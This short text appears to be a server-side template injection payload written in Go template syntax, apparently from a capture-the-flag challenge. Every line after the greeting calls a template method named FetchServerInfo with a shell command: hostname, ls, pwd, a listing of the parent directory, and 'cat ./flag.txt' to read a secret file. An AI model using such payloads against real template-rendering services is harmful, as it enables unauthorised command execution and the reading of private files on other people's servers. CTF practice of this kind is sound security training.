Hello, {{.ClientUA}}

test, {{ .FetchServerInfo "hostname" }}

ls, {{ .FetchServerInfo "ls" }}

cat, {{ .FetchServerInfo "pwd" }}

ls2: {{ .FetchServerInfo "ls ../" }}

cat: {{ .FetchServerInfo "cat ./flag.txt" }}
